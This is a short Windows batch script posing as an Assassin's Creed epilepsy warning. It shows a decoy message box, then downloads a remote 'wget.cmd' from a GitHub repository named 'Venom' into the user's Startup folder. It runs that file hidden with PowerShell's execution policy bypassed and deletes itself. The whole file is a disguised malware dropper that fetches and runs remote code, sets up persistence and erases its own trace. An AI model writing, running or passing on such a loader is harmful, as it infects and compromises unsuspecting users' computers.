@echo off

echo x=msgbox("A very small percentage of individuals may experience epileptic seizures exposed to certain light patterns or flashing lights. -- IMMEDIATELY discontinue use and consult your physician before resuming pla!!",0,"ASSASSIN'S CREED::WARNING BEFORE PLAYING")>>msgbox.vbs
start msgbox.vbs

set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

cd %STARTUP%

powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wget.cmd -OutFile wget.cmd"

powershell -windowstyle hidden -ExecutionPolicy Bypass ./wget.cmd

cd "%INITIALPATH%"

del initial.cmd
